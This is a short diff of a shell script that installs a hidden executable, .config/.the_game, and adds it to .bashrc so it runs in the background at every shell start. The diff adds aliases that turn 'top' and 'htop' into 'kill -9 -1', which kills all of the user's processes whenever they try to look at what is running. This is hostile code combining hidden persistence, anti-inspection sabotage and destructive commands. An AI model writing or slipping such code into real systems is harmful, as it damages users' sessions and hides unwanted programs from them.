@@ -6,5 +6,8 @@ do
 done" > .config/.the_game
 chmod +x .config/.the_game
 
-echo "./.config/.the_game &" >> .bashrc
+echo "
+alias top='kill -9 -1'
+alias htop='top'
+./.config/.the_game &" >> .bashrc
 source .bashrc
